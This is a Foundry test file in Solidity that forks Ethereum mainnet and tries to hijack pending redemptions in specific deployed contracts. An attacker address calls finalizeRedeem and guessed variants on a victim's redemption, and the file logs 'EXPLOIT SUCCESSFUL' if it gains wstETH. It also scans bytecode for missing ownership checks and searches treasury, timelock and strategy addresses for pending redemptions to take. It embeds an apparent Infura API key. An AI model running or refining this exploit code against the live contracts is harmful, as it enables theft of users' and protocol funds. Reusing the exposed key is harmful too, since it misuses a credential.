// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IRedemption {
    function redeem(uint96 amount) external;
    function finalizeRedeem(uint256 index) external;
    function getRedeemLength(address user) external view returns (uint256);
    function getRedeemInfo(address user, uint256 index) external view returns (uint96, uint64, bool);
}

contract HijackRedemption is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_TryHijackRedemption() public {
        console.log("=== TRYING TO HIJACK REDEMPTION ===\n");

        // KEY INSIGHT: RC.redeem sends wstETH to CALLER (msg.sender)
        // If finalizeRedeem doesn't validate ownership, we can hijack!

        // First, let's create a legitimate redemption from a victim
        address victim = makeAddr("victim");
        deal(IAU, victim, 10000e18);

        vm.startPrank(victim);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        console.log("Victim creating redemption...");
        // Try to redeem (might fail due to various checks)
        (bool success,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("Victim redeem success:", success);
        vm.stopPrank();

        // Check victim's pending redemptions
        uint256 victimLen = IRedemption(REDEMPTION_0).getRedeemLength(victim);
        console.log("Victim pending redemptions:", victimLen);

        if (victimLen > 0) {
            // Fast forward time
            vm.warp(block.timestamp + 8 days);

            uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
            uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);

            // NOW: Can attacker call finalizeRedeem for victim's redemption?
            vm.startPrank(attacker);

            console.log("\nAttacker trying to finalize victim's redemption...");
            (bool s1, bytes memory d1) = REDEMPTION_0.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
            );
            console.log("finalizeRedeem(0):", s1);
            if (!s1 && d1.length >= 4) {
                console.log("Error:");
                console.logBytes4(bytes4(d1));
            }

            // Try with user parameter
            (bool s2, bytes memory d2) = REDEMPTION_0.call(
                abi.encodeWithSignature("finalizeRedeemFor(address,uint256)", victim, 0)
            );
            console.log("finalizeRedeemFor:", s2);

            vm.stopPrank();

            uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
            uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

            console.log("\nResults:");
            console.log("Vault change:", int256(vaultAfter) - int256(vaultBefore));
            console.log("Attacker wstETH:", attackerAfter);

            if (attackerAfter > attackerBefore) {
                console.log("\n*** EXPLOIT SUCCESSFUL - HIJACKED REDEMPTION! ***");
            }
        }
    }

    function test_AnalyzeFinalizeRedeemAccess() public view {
        console.log("=== ANALYZING FINALIZE REDEEM ACCESS CONTROL ===\n");

        // The critical question: does finalizeRedeem(index) use msg.sender
        // to lookup the redemption, or is there a way to specify user?

        bytes memory code = REDEMPTION_0.code;

        // Find finalizeRedeem function
        bytes4 finalizeSel = bytes4(keccak256("finalizeRedeem(uint256)"));
        console.log("finalizeRedeem selector:");
        console.logBytes4(finalizeSel);

        // Also search for any function that takes (address, uint256)
        // which might allow specifying the user
        bytes4[] memory sels = new bytes4[](5);
        sels[0] = bytes4(keccak256("finalizeRedeemFor(address,uint256)"));
        sels[1] = bytes4(keccak256("finalizeRedeem(address,uint256)"));
        sels[2] = bytes4(keccak256("claimRedemption(address,uint256)"));
        sels[3] = bytes4(keccak256("processRedemption(address,uint256)"));
        sels[4] = bytes4(keccak256("executeRedemption(address,uint256)"));

        console.log("\nSearching for user-specified finalize functions:");
        for (uint s = 0; s < sels.length; s++) {
            for (uint i = 0; i + 4 < code.length; i++) {
                if (uint8(code[i]) == 0x63) {
                    bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                    if (sel == sels[s]) {
                        console.log("FOUND:");
                        console.logBytes4(sels[s]);
                        console.log("At offset:", i);
                    }
                }
            }
        }

        // Check the bytecode of finalizeRedeem to see how it looks up the request
        // The key is whether CALLER is used to compute the storage slot
        console.log("\nAnalyzing finalizeRedeem bytecode for CALLER usage:");

        // Find CALLER near the beginning of finalizeRedeem
        // After selector match, look for CALLER in the function body

        for (uint i = 100; i < 500 && i < code.length; i++) {
            if (uint8(code[i]) == 0x33) { // CALLER
                console.log("CALLER at offset:", i);
            }
            if (uint8(code[i]) == 0x20) { // SHA3 (for mapping lookup)
                console.log("SHA3 at offset:", i);
            }
        }
    }

    function test_FindPendingRedemptionsAnyone() public view {
        console.log("=== SEARCHING FOR ANY PENDING REDEMPTIONS ===\n");

        // Scan some likely addresses for pending redemptions

        address[] memory candidates = new address[](20);
        candidates[0] = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943; // Strategy 0
        candidates[1] = 0x5aE0e44DE96885702bD99A6914751C952d284938; // Strategy 1
        candidates[2] = 0xB27D688Ac06a441c005657971B11521e80CdcE98; // Strategy 2
        candidates[3] = 0xbfdF0aF6Df48E645Bd076802B95DDEf0b1E02a9d; // Strategy 3
        candidates[4] = VAULT;
        candidates[5] = REDEMPTION_CONTROLLER;
        candidates[6] = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e; // Timelock
        candidates[7] = 0xb6C71AaF9bf23D545FEF08a40f8a8aC95FBF9dAE; // Treasury
        candidates[8] = 0x22261B4D6F629D8cF946C3524df86bF7222901F6; // Safe owner
        candidates[9] = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e; // SLOT5_SLOT5

        // Add some random addresses that might have interacted
        for (uint i = 10; i < 20; i++) {
            candidates[i] = address(uint160(0x1000 + i));
        }

        console.log("Checking REDEMPTION_0 for pending redemptions:");
        for (uint i = 0; i < candidates.length; i++) {
            if (candidates[i] == address(0)) continue;

            try IRedemption(REDEMPTION_0).getRedeemLength(candidates[i]) returns (uint256 len) {
                if (len > 0) {
                    console.log("  Address has pending:", candidates[i]);
                    console.log("    Count:", len);

                    for (uint j = 0; j < len && j < 3; j++) {
                        try IRedemption(REDEMPTION_0).getRedeemInfo(candidates[i], j) returns (uint96 amt, uint64 ts, bool fin) {
                            if (!fin) {
                                console.log("    [", j, "] Amount:", uint256(amt) / 1e18);
                                console.log("        Ready:", block.timestamp > ts + 604800);
                            }
                        } catch {}
                    }
                }
            } catch {}
        }

        console.log("\nChecking REDEMPTION_1 for pending redemptions:");
        for (uint i = 0; i < candidates.length; i++) {
            if (candidates[i] == address(0)) continue;

            try IRedemption(REDEMPTION_1).getRedeemLength(candidates[i]) returns (uint256 len) {
                if (len > 0) {
                    console.log("  Address has pending:", candidates[i]);
                    console.log("    Count:", len);
                }
            } catch {}
        }
    }

    function test_REDEMPTION1_DetailedAnalysis() public view {
        console.log("=== REDEMPTION_1 DETAILED ANALYSIS ===\n");

        // REDEMPTION_1 is smaller (6202 bytes) vs REDEMPTION_0 (9439 bytes)
        // It has RC.redeem at offsets 3627 and 3861

        bytes memory code = REDEMPTION_1.code;

        // Dump opcodes around RC.redeem calls
        console.log("Bytecode around RC.redeem at 3627:");
        for (uint i = 3580; i < 3700 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0xf1) console.log(i, "CALL");

            if (op == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                console.log(i, "PUSH4:");
                console.logBytes4(sel);
            }
        }

        console.log("\nBytecode around RC.redeem at 3861:");
        for (uint i = 3810; i < 3950 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0xf1) console.log(i, "CALL");

            if (op == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                console.log(i, "PUSH4:");
                console.logBytes4(sel);
            }
        }

        // Check if there's CALLER before RC.redeem in REDEMPTION_1
        console.log("\nCALLER positions in REDEMPTION_1 (3500-4000):");
        for (uint i = 3500; i < 4000 && i < code.length; i++) {
            if (uint8(code[i]) == 0x33) {
                console.log("CALLER at:", i);
            }
        }
    }

    function test_SimulateRedemptionFlow() public {
        console.log("=== SIMULATING REDEMPTION FLOW ===\n");

        // Create a simulated scenario where we have a pending redemption
        // and try to finalize it

        // Use vm.store to create a fake pending redemption
        // The storage layout for pending redemptions is typically:
        // mapping(address => Redemption[]) pendingRedemptions;

        // First, let's see what storage slot 5 looks like (redemptionFee was 5)
        console.log("REDEMPTION_0 storage layout:");
        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // The mapping slot for pendingRedemptions is probably around slot 6-10
        // To compute: keccak256(abi.encode(user, slot))

        console.log("\nComputing mapping slots for attacker:");
        for (uint slot = 5; slot <= 15; slot++) {
            bytes32 mappingSlot = keccak256(abi.encode(attacker, slot));
            bytes32 value = vm.load(REDEMPTION_0, mappingSlot);
            if (value != bytes32(0)) {
                console.log("Found data at mapping slot", slot, ":");
                console.logBytes32(value);
            }

            // Also check length (for dynamic arrays)
            bytes32 lengthSlot = keccak256(abi.encode(attacker, slot));
            bytes32 length = vm.load(REDEMPTION_0, lengthSlot);
            if (length != bytes32(0)) {
                console.log("Length at slot", slot, ":", uint256(length));
            }
        }
    }
}
